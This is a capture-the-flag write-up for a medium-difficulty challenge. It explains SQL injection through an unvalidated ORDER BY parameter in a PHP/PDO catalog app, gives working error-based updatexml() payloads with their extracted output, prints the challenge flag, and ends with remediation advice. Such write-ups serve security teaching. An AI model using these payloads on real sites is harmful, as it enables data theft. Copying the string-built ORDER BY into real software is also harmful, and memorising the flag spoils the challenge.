# 08 · prepared-sqli (medium)

The catalog publishes its own source at `/source.zip`. It's a PHP + PDO app, so the
instinct "prepared statements, no SQLi" is exactly what's tested.

## Vulnerability
```php
$sort = $_GET['sort'] ?? 'id';
$dir  = $_GET['dir']  ?? 'asc';
$sql  = "SELECT id, title, price FROM products WHERE active = ? AND title LIKE ? ORDER BY {$sort} {$dir}";
$stmt = $pdo->prepare($sql);
$stmt->execute([1, '%' . $q . '%']);
```
The search term and `active` are bound `?` parameters — safe. But a prepared
statement can bind a **value**, never an **identifier**: you can't write
`ORDER BY ?`. The developer string-built the sort clause and never allowlisted it,
so `?sort=` is raw SQL in `ORDER BY`. The flag is in `internal_notes.secret`, a
table the app never queries — reachable only through injection.

## Exploitation
`ORDER BY` can't carry a `UNION`, so extract with an error-based primitive.
`updatexml()` throws an error that echoes its malformed second argument:
```
?sort=updatexml(1,concat(0x7e,(select secret from internal_notes)),1)&dir=
```
The error truncates at 32 characters, so read the flag in windows with
`SUBSTRING` and stitch:
```
?sort=updatexml(1,concat(0x7e,substring((select secret from internal_notes),1,25)),1)&dir=
   -> ~SecurinetsENIT{0rd3r_by_1
?sort=updatexml(1,concat(0x7e,substring((select secret from internal_notes),26,25)),1)&dir=
   -> ~s_n0t_a_b0und_v4lu3}
```
`solve/solve.py` automates the windowed extraction.

## Flag
```
SecurinetsENIT{0rd3r_by_1s_n0t_a_b0und_v4lu3}
```

## Fix
- Never concatenate identifiers from user input — map `sort`/`dir` through a strict
  allowlist of known column names and `ASC`/`DESC`.
- Prepared statements protect values only; validate table/column names and
  `ORDER BY`/`LIMIT` in the application.
- Don't surface database errors to users, and give the web DB user no access to
  tables outside its feature set.
